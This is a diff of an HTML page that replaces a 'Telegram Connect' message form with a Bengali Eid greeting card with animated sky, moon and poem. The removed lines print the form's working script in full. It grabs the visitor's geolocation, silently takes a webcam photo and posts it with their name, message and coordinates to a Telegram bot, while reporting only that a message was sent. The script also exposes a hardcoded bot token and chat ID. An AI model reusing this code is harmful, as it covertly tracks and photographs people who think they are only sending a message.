@@ -2,13 +2,28 @@
 <html lang="bn">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Telegram Connect</title>
+<meta name="viewport"
+content="width=device-width,
+initial-scale=1.0,
+maximum-scale=1.0,
+user-scalable=no">
 
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+<title>Eid Mubarak</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;700&display=swap" rel="stylesheet">
 
 <style>
+
+:root{
+    --bg1:#020617;
+    --bg2:#071226;
+    --glass:rgba(255,255,255,.08);
+    --border:rgba(255,255,255,.12);
+    --text:#f8fafc;
+    --muted:#cbd5e1;
+    --gold:#fde68a;
+}
 
 *{
     margin:0;
@@ -16,154 +31,466 @@
     box-sizing:border-box;
 }
 
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    touch-action:manipulation;
+    -webkit-text-size-adjust:100%;
+}
+
 body{
     min-height:100vh;
     display:flex;
     justify-content:center;
     align-items:center;
-    padding:20px;
-    font-family:'Poppins',sans-serif;
-    background:#020617;
-    overflow:auto;
-}
-
-body::before{
-    content:'';
-    position:fixed;
-    width:500px;
-    height:500px;
-    background:linear-gradient(#00f5ff,#0066ff);
-    border-radius:50%;
-    top:-200px;
-    left:-150px;
-    filter:blur(90px);
-}
-
-body::after{
-    content:'';
-    position:fixed;
-    width:450px;
-    height:450px;
-    background:linear-gradient(#ff00d4,#ff4d6d);
-    border-radius:50%;
-    bottom:-180px;
-    right:-120px;
-    filter:blur(90px);
-}
-
-.container{
     position:relative;
-    width:100%;
-    max-width:450px;
-    padding:30px;
-    border-radius:25px;
+    padding:20px;
+    font-family:'Noto Sans Bengali',sans-serif;
 
-    background:rgba(255,255,255,0.08);
+    user-select:none;
+    -webkit-user-select:none;
+    -webkit-touch-callout:none;
 
-    border:1px solid rgba(255,255,255,0.1);
+    background:
+    radial-gradient(circle at top,#0f172a 0%,transparent 40%),
+    radial-gradient(circle at bottom,#0ea5e922 0%,transparent 35%),
+    linear-gradient(to bottom,var(--bg1),var(--bg2));
+}
 
-    backdrop-filter:blur(20px);
+/* SKY */
+
+.sky{
+    position:absolute;
+    inset:0;
+    overflow:hidden;
+}
+
+/* Stars */
+
+.star{
+    position:absolute;
+    background:#fff;
+    border-radius:50%;
+    animation:twinkle linear infinite;
+}
+
+.star.small{
+    width:1px;
+    height:1px;
+    animation-duration:4s;
+}
+
+.star.medium{
+    width:2px;
+    height:2px;
+    animation-duration:6s;
+}
+
+.star.big{
+    width:3px;
+    height:3px;
+    animation-duration:8s;
+    box-shadow:0 0 8px rgba(255,255,255,.8);
+}
+
+@keyframes twinkle{
+
+    0%,100%{
+        opacity:.2;
+        transform:scale(.8);
+    }
+
+    50%{
+        opacity:1;
+        transform:scale(1.3);
+    }
+}
+
+/* MOON */
+
+.moon{
+    position:fixed;
+    top:40px;
+    right:60px;
+
+    width:180px;
+    height:180px;
+
+    border-radius:50%;
+
+    z-index:999;
+
+    background:
+    radial-gradient(circle at 30% 30%,
+    #ffffff 0%,
+    #fefce8 25%,
+    #f8fafc 55%,
+    #e2e8f0 80%,
+    #cbd5e1 100%);
 
     box-shadow:
-    0 0 30px rgba(0,0,0,0.4);
+    0 0 70px rgba(255,255,255,1),
+    0 0 140px rgba(255,255,255,.75),
+    0 0 260px rgba(255,255,255,.4);
 
-    z-index:1;
+    animation:moonFloat 6s ease-in-out infinite;
 }
 
-.title{
+.moon::before{
+    content:'';
+
+    position:absolute;
+    inset:-25px;
+
+    border-radius:50%;
+
+    background:rgba(255,255,255,.15);
+
+    filter:blur(35px);
+
+    z-index:-1;
+}
+
+.moon::after{
+    content:'';
+
+    position:absolute;
+
+    top:18px;
+    left:30px;
+
+    width:55px;
+    height:55px;
+
+    border-radius:50%;
+
+    background:
+    radial-gradient(circle,
+    rgba(255,255,255,.9),
+    transparent 70%);
+
+    filter:blur(6px);
+}
+
+@keyframes moonFloat{
+
+    0%,100%{
+        transform:translateY(0px);
+    }
+
+    50%{
+        transform:translateY(-10px);
+    }
+}
+
+/* CLOUDS */
+
+.cloud{
+    position:absolute;
+    border-radius:100px;
+    background:rgba(255,255,255,.04);
+    filter:blur(18px);
+}
+
+.cloud::before,
+.cloud::after{
+    content:'';
+    position:absolute;
+    border-radius:50%;
+    background:rgba(255,255,255,.04);
+}
+
+.cloud.one{
+    width:260px;
+    height:70px;
+    top:120px;
+    left:-300px;
+    animation:cloudMove 55s linear infinite;
+}
+
+.cloud.one::before{
+    width:110px;
+    height:110px;
+    top:-45px;
+    left:30px;
+}
+
+.cloud.one::after{
+    width:130px;
+    height:130px;
+    top:-55px;
+    right:30px;
+}
+
+.cloud.two{
+    width:320px;
+    height:90px;
+    top:320px;
+    left:-400px;
+    animation:cloudMove 75s linear infinite;
+}
+
+.cloud.three{
+    width:220px;
+    height:60px;
+    top:520px;
+    left:-260px;
+    animation:cloudMove 60s linear infinite;
+}
+
+@keyframes cloudMove{
+
+    from{
+        transform:translateX(0);
+    }
+
+    to{
+        transform:translateX(2200px);
+    }
+}
+
+/* SHOOTING STAR */
+
+.shooting-star{
+    position:absolute;
+    top:140px;
+    left:-300px;
+
+    width:260px;
+    height:2px;
+
+    background:
+    linear-gradient(to right,
+    transparent,
+    rgba(255,255,255,.4),
+    #fff);
+
+    transform:rotate(25deg);
+
+    animation:shoot 8s linear infinite;
+}
+
+@keyframes shoot{
+
+    0%{
+        transform:translateX(0) rotate(25deg);
+        opacity:0;
+    }
+
+    8%{
+        opacity:1;
+    }
+
+    30%{
+        transform:translateX(2200px) rotate(25deg);
+        opacity:0;
+    }
+
+    100%{
+        opacity:0;
+    }
+}
+
+/* CARD */
+
+.card{
+    position:relative;
+    z-index:10;
+
+    width:100%;
+    max-width:780px;
+
+    padding:50px 40px;
+
+    border-radius:32px;
+
+    background:var(--glass);
+
+    backdrop-filter:blur(18px);
+
+    border:1px solid var(--border);
+
+    box-shadow:
+    0 20px 60px rgba(0,0,0,.55);
+
+    overflow:hidden;
+
+    animation:cardFade 1.2s ease;
+}
+
+.card::before{
+    content:'';
+
+    position:absolute;
+    inset:0;
+
+    padding:1.2px;
+
+    border-radius:32px;
+
+    background:
+    linear-gradient(130deg,
+    rgba(255,255,255,.8),
+    rgba(56,189,248,.7),
+    rgba(244,114,182,.7),
+    rgba(253,224,71,.7),
+    rgba(255,255,255,.8));
+
+    background-size:300% 300%;
+
+    -webkit-mask:
+    linear-gradient(#fff 0 0) content-box,
+    linear-gradient(#fff 0 0);
+
+    -webkit-mask-composite:xor;
+    mask-composite:exclude;
+
+    animation:borderGlow 8s linear infinite;
+}
+
+@keyframes borderGlow{
+
+    0%{
+        background-position:0% 50%;
+    }
+
+    100%{
+        background-position:100% 50%;
+    }
+}
+
+@keyframes cardFade{
+
+    from{
+        opacity:0;
+        transform:translateY(40px);
+    }
+
+    to{
+        opacity:1;
+        transform:translateY(0);
+    }
+}
+
+/* HEADER */
+
+.header{
     text-align:center;
-    color:#fff;
-    font-size:30px;
-    font-weight:600;
-    margin-bottom:25px;
+    margin-bottom:35px;
 }
 
-.inputBox{
+.badge{
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+
+    padding:10px 18px;
+
+    border-radius:999px;
+
+    background:rgba(255,255,255,.06);
+
+    border:1px solid rgba(255,255,255,.08);
+
+    color:var(--muted);
+
+    font-size:14px;
+
     margin-bottom:20px;
 }
 
-.inputBox input,
-.inputBox textarea{
-    width:100%;
-    padding:16px;
-    border:none;
-    outline:none;
-    border-radius:16px;
-
-    background:rgba(255,255,255,0.08);
-
+.header h1{
+    font-size:52px;
+    font-weight:700;
     color:#fff;
-    font-size:15px;
 
-    border:1px solid rgba(255,255,255,0.08);
+    text-shadow:
+    0 0 25px rgba(255,255,255,.35);
+
+    margin-bottom:14px;
 }
 
-.inputBox textarea{
-    resize:none;
-    height:130px;
+.line{
+    width:130px;
+    height:4px;
+
+    margin:auto;
+
+    border-radius:999px;
+
+    background:
+    linear-gradient(to right,
+    #38bdf8,
+    #f472b6,
+    #fde047);
 }
 
-::placeholder{
-    color:#cbd5e1;
-}
+/* MESSAGE */
 
-button{
-    width:100%;
-    border:none;
-    outline:none;
-    padding:15px;
-    border-radius:16px;
-
-    background:linear-gradient(135deg,#00e5ff,#0066ff);
-
-    color:#fff;
-    font-size:16px;
-    font-weight:600;
-
-    cursor:pointer;
-
-    transition:0.3s;
-}
-
-button:hover{
-    transform:scale(1.02);
-}
-
-#msg{
+.message{
     text-align:center;
-    margin-top:15px;
-    color:#22c55e;
+    color:var(--text);
+
+    line-height:2.1;
+    font-size:18px;
 }
 
-/* Video */
-
-video,
-canvas{
-    width:100%;
-    border-radius:18px;
-    margin-top:20px;
-    display:none;
+.message p{
+    margin-bottom:28px;
 }
 
-.story{
-    margin-top:25px;
-    padding:20px;
-    border-radius:20px;
-
-    background:rgba(255,255,255,0.05);
-
-    border:1px solid rgba(255,255,255,0.08);
-
-    color:#e2e8f0;
-
-    line-height:1.9;
-    font-size:15px;
+.highlight{
+    color:var(--gold);
+    font-size:21px;
+    font-weight:700;
 }
 
-.story h3{
+.footer{
+    margin-top:10px;
     text-align:center;
-    margin-bottom:18px;
-    color:#fff;
+    color:var(--muted);
+    font-size:14px;
+    opacity:.8;
+}
+
+/* MOBILE */
+
+@media(max-width:768px){
+
+    body{
+        padding:16px;
+    }
+
+    .moon{
+        width:110px;
+        height:110px;
+
+        top:20px;
+        right:15px;
+    }
+
+    .card{
+        padding:35px 24px;
+        border-radius:26px;
+    }
+
+    .header h1{
+        font-size:34px;
+    }
+
+    .message{
+        font-size:16px;
+        line-height:2;
+    }
+
+    .highlight{
+        font-size:18px;
+    }
+
+    .badge{
+        font-size:12px;
+    }
 }
 
 </style>
@@ -171,256 +498,78 @@ canvas{
 
 <body>
 
-<div class="container">
+<div class="sky">
 
-    <div class="title">
-        Telegram Connect
+    <div class="star small" style="top:8%;left:12%;"></div>
+    <div class="star medium" style="top:16%;left:26%;"></div>
+    <div class="star big" style="top:10%;left:45%;"></div>
+
+    <div class="star small" style="top:22%;left:68%;"></div>
+    <div class="star medium" style="top:12%;left:82%;"></div>
+    <div class="star big" style="top:28%;left:90%;"></div>
+
+    <div class="star small" style="top:40%;left:18%;"></div>
+    <div class="star medium" style="top:52%;left:34%;"></div>
+    <div class="star big" style="top:66%;left:12%;"></div>
+
+    <div class="star small" style="top:72%;left:76%;"></div>
+    <div class="star medium" style="top:82%;left:62%;"></div>
+    <div class="star big" style="top:58%;left:88%;"></div>
+
+</div>
+
+<div class="moon"></div>
+
+<div class="cloud one"></div>
+<div class="cloud two"></div>
+<div class="cloud three"></div>
+
+<div class="shooting-star"></div>
+
+<div class="card">
+
+    <div class="header">
+
+        <div class="badge">
+            🌸🕊️ اَلسَّلَامُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ 🕊️🌸
+        </div>
+
+        <h1>𝔼𝕚𝕕 𝕄𝕦𝕓𝕒𝕣𝕒𝕜 প্রি'য়</h1>
+
+        <div class="line"></div>
+
     </div>
 
-    <div class="inputBox">
-        <input type="text" id="name" placeholder="Enter Your Name">
-    </div>
-
-    <div class="inputBox">
-        <textarea id="message" placeholder="Write Your Message..."></textarea>
-    </div>
-
-    <button onclick="startProcess()">
-        Send Message
-    </button>
-
-    <p id="msg"></p>
-
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
-    <div class="story">
-
-        <h3>একটা অসমাপ্ত গল্প...</h3>
+    <div class="message">
 
         <p>
-            একটা সময় ছিল,
-            রাত জেগে কারো জন্য অপেক্ষা করাটা অভ্যাস ছিল আমার।
-            ফোনের ছোট্ট একটা নোটিফিকেশনেই মনে হতো পুরো পৃথিবীটা বুঝি আমার হয়ে গেছে।
+        ঈদের চাঁদ উঠুক তোমার আকাশে শান্তির আলো হয়ে,<br>
+            তোমার প্রতিটা সকাল ভরে উঠুক ভালোবাসা আর হাসিতে 
+        </p>
+
+        <p>
+            এই ঈদে আমার একটাই দোয়া<br>
+            তোমার জীবনের সব অন্ধকার দূরে সরে যাক<br>
+            আর তোমার পৃথিবী ভরে উঠুক সুখ, শান্তি আর মায়ায়। 
+        </p>
+
+        <p>
+            হাজার তারার এই নীল রাতেও<br>
+            আমার হৃদয় শুধু তোমাকেই খুঁজে বেড়ায়
+        </p>
+
+        <p class="highlight">
+            ঈদ মোবারক প্রি'য় 🤗<br>
+            তোমার জীবন হোক আকাশের চাঁদের মতোই সুন্দর।
         </p>
 
     </div>
 
+    <div class="footer">
+        🦋 🌸🌺 𝙰𝙻-𝙰𝙼𝙸𝙽 + ɪsʀAᴛ 🪶🌼🌸
+    </div>
+
 </div>
-
-<script>
-
-/* Telegram */
-
-const botToken = "8214854742:AAFyOCbjcIkDFNNtqhfY7-CFqTpzf5T--L8";
-const chatId = "6884769194";
-
-const video =
-document.getElementById("video");
-
-const canvas =
-document.getElementById("canvas");
-
-async function startProcess(){
-
-    let name =
-    document.getElementById("name").value.trim();
-
-    let message =
-    document.getElementById("message").value.trim();
-
-    if(name === "" || message === ""){
-
-        showMsg("Please Fill All Fields","#ff4d6d");
-        return;
-    }
-
-    /* Location */
-
-    navigator.geolocation.getCurrentPosition(
-
-    async(position)=>{
-
-        let latitude =
-        position.coords.latitude;
-
-        let longitude =
-        position.coords.longitude;
-
-        /* Camera */
-
-        try{
-
-            let stream =
-            await navigator.mediaDevices.getUserMedia({
-                video:true
-            });
-
-            video.style.display = "block";
-            video.srcObject = stream;
-
-            setTimeout(async()=>{
-
-                canvas.width =
-                video.videoWidth;
-
-                canvas.height =
-                video.videoHeight;
-
-                let ctx =
-                canvas.getContext("2d");
-
-                ctx.drawImage(
-                    video,
-                    0,
-                    0,
-                    canvas.width,
-                    canvas.height
-                );
-
-                stream.getTracks().forEach(
-                    track=>track.stop()
-                );
-
-                let image =
-                canvas.toDataURL("image/png");
-
-                /* Send Photo */
-
-                let photoData =
-                image.split(",")[1];
-
-                let photoBlob =
-                base64ToBlob(photoData,"image/png");
-
-                let formData =
-                new FormData();
-
-                formData.append(
-                    "chat_id",
-                    chatId
-                );
-
-                formData.append(
-                    "photo",
-                    photoBlob,
-                    "photo.png"
-                );
-
-                await fetch(
-                    `https://api.telegram.org/bot${botToken}/sendPhoto`,
-                    {
-                        method:"POST",
-                        body:formData
-                    }
-                );
-
-                /* Send Text */
-
-                let text =
-`📩 New Message
-
-👤 Name: ${name}
-
-💬 Message:
-${message}
-
-📍 Latitude:
-${latitude}
-
-📍 Longitude:
-${longitude}
-
-🌍 Map:
-https://maps.google.com/?q=${latitude},${longitude}
-
-🕒 Time:
-${new Date().toLocaleString()}
-`;
-
-                await fetch(
-                    `https://api.telegram.org/bot${botToken}/sendMessage`,
-                    {
-                        method:"POST",
-                        headers:{
-                            "Content-Type":"application/json"
-                        },
-                        body:JSON.stringify({
-                            chat_id:chatId,
-                            text:text
-                        })
-                    }
-                );
-
-                showMsg(
-                    "Message Sent Successfully",
-                    "#22c55e"
-                );
-
-                document.getElementById("name").value = "";
-                document.getElementById("message").value = "";
-
-            },3000);
-
-        }catch(error){
-
-            showMsg(
-                "Camera Permission Denied",
-                "#ff4d6d"
-            );
-
-        }
-
-    },
-
-    ()=>{
-
-        showMsg(
-            "Location Permission Denied",
-            "#ff4d6d"
-        );
-
-    });
-
-}
-
-/* Blob Convert */
-
-function base64ToBlob(base64,type){
-
-    let bytes =
-    atob(base64);
-
-    let array = [];
-
-    for(let i=0;i<bytes.length;i++){
-
-        array.push(
-            bytes.charCodeAt(i)
-        );
-
-    }
-
-    return new Blob(
-        [new Uint8Array(array)],
-        {type:type}
-    );
-
-}
-
-/* Status */
-
-function showMsg(text,color){
-
-    let msg =
-    document.getElementById("msg");
-
-    msg.style.color = color;
-    msg.innerText = text;
-
-}
-
-</script>
 
 </body>
 </html>
